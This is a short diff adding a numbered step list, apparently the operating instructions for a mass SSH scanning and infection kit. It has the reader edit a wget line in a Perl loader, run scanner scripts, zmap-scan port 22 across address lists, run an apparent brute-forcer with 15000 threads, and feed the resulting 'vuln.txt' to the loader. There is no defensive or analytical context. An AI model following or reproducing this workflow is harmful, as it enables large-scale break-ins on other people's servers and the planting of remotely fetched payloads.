@@ -1,0 +1,21 @@
+Steps made by Ports VPNs
+
+1. drag files 
+
+2.change wget in (slump.pl)
+
+3.sh Scanner.sh
+
+4.sh Scanner.sh
+
+5.sh zmap.sh.sh
+
+6.drag (vuln.txt) and some list
+
+7.chmod 777 *
+
+8.zmap -p22 -w (your list) -o mfu.txt -B100M
+
+9. ./update 15000
+
+10. perl slump.pl vuln.txt
